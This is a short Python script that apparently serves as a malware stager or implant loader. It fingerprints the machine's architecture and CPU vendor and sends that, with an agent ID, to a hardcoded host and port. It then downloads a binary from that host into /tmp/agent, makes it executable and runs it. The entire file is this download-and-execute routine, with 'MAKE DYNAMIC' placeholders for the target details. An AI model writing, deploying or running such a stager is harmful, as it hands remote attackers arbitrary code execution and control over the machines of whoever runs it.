import socket
import os
import time
import platform
import stat

port=4153 #MAKE DYNAMIC
host="10.20.80.134" #MAKE DYNAMIC

outputfile="/tmp/agent" #MAKE DYNAMIC

padding= b'\x00\x00\x00\x00\x00\x00\x00\x27'
name="39519bc2-9c07-4e76-8774-0554edcaf7c4" #MAKE DYNAMIC
OS="L"

if(platform.machine()== "x86_64"):
    ARCH="6"
else:
    ARCH="3"

PROC=""
if(os.popen("cat /proc/cpuinfo |grep 'Intel'").read()):
    PROC="I"
elif(os.popen("cat /proc/cpuinfo |grep 'ARM'").read()):
    PROC="A"
elif(os.popen("cat /proc/cpuinfo |grep 'MIPS'")).read():
    PROC="M"

fullname = padding + bytes(name, "utf-8") + bytes(OS, "utf-8") + bytes(ARCH, "utf-8") + bytes(PROC, "utf-8")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(fullname)

out=b''

while True:
    rec = s.recv(1024)
    if not rec: 
        break
    out += rec

outfile = open(outputfile,"wb")
outfile.write(out)
outfile.close()

s.close()

st = os.stat(outputfile)
os.chmod(outputfile, st.st_mode | stat.S_IEXEC)
os.system(outputfile)